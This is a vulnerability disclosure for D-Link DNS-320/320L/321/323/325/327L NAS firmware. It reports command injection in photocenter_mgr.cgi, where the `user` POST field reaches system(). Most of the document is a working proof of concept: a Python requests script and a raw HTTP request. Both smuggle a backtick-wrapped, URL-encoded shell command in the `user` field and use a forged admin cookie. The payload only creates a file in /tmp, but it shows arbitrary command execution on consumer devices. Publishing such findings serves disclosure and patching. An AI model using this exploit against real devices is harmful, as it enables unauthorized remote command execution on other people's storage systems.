# Overview
Firmware download website:
 [https://ftp.dlink.ru/pub/NAS/](https://ftp.dlink.ru/pub/NAS/)

# Affected version
DLINK DNS-320/320L/321/323/325/327L  all firmware version
# Vulnerability details
The DLINK nas DNS-320/320L/321/323/325/327L  all firmware version has a command injection vulnerability in cgi_get_fullscreen_photos function of the file /cgi-bin/photocenter_mgr.cgi.  The variable `user` is passed from a POST request and is assigned to `v13` via the `sprintf` function at line 60. It is then passed into `v10` and invoked by the `system` command, which leads to command execution.  
![image.png](https://cdn.nlark.com/yuque/0/2024/png/2771021/1723389375899-f5444845-d3a1-4f4c-aa5b-633d87a3fc72.png#averageHue=%23fdfdfc&clientId=u18c9b73a-ae45-4&from=paste&height=540&id=m9NMB&originHeight=608&originWidth=1504&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=97663&status=done&style=none&taskId=uff361ece-9a48-4963-9454-020675a6585&title=&width=1336.888888888889)
# POC
```python
import requests

url = "http://192.168.0.32/cgi-bin/photocenter_mgr.cgi"
headers = {
    "Host": "192.168.0.32",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "http://192.168.0.32",
    "Connection": "close",
    "Referer": "http://192.168.0.32/photo_center/index.html",
    "Cookie": "username=admin",
    "Priority": "u=1"
}

data = "cmd=cgi_get_fullscreen_photos&filter=admin&user=%60%74%6f%75%63%68%09%2f%74%6d%70%2f%32%32%32%60&rp=10&page=10&r=10&date=19&folder=19"
response = requests.post(url, headers=headers, data=data)
print(response.text)

```

```
POST /cgi-bin/photocenter_mgr.cgi HTTP/1.1
Host: 192.168.0.32
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Content-Length: 133
Origin: http://192.168.0.32
Connection: close
Referer: http://192.168.0.32/photo_center/index.html
Cookie: username=admin
Priority: u=1

cmd=cgi_get_fullscreen_photos&filter=admin&user=%60%74%6f%75%63%68%09%2f%74%6d%70%2f%32%32%32%60&rp=10&page=10&r=10&date=19&folder=19
```

